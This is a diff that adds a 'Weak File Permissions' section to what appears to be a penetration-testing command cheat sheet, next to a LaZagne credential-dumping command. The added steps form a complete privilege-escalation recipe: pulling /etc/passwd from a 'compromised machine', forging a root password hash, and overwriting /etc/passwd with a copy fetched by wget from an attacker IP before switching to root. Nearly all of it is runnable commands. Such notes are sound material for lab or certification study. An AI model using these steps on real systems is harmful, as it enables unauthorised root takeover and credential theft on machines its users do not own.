@@ -183,4 +183,59 @@ It looks like you're compiling a list of commands and steps for a penetration te
 - **Retrieve passwords from a specific email client:**
   ```bash
   python laZagne.py email
+
  
+
+## Weak File Permissions
+
+1. **Check `/etc/passwd` Permissions:**
+   ```bash
+   ls -l /etc/passwd
+   ```
+
+2. **Backup `/etc/passwd`:**
+   ```bash
+   cp /etc/passwd /tmp/passwd.bak
+   ```
+
+3. **Copy `/etc/passwd` to Local Machine:**
+   ```bash
+   scp user@compromised_machine:/etc/passwd /local/path/passwd
+   ```
+
+4. **Generate Password Hash:**
+   ```bash
+   openssl passwd -6 password123
+   ```
+
+5. **Edit `/etc/passwd` on Local Machine:**
+   ```bash
+   # Open the passwd file in a text editor
+   nano /local/path/passwd
+
+   # Replace the root entry with the new hash
+   root:ssssssssssssss:0:0:root:/root:/bin/bash
+   ```
+
+6. **Upload Modified `/etc/passwd` to Compromised Machine:**
+   ```bash
+   scp /local/path/passwd user@compromised_machine:/tmp/passwd
+   ```
+
+7. **Replace `/etc/passwd` on Compromised Machine:**
+   ```bash
+   wget http://10.10.x.x/passw -O /etc/passwd
+   ```
+
+8. **Switch to Root User:**
+   ```bash
+   su root
+   ```
+
+9. **Enter the Password:**
+   ```bash
+   # Enter the password you used to generate the hash
+   ```
+
+
+
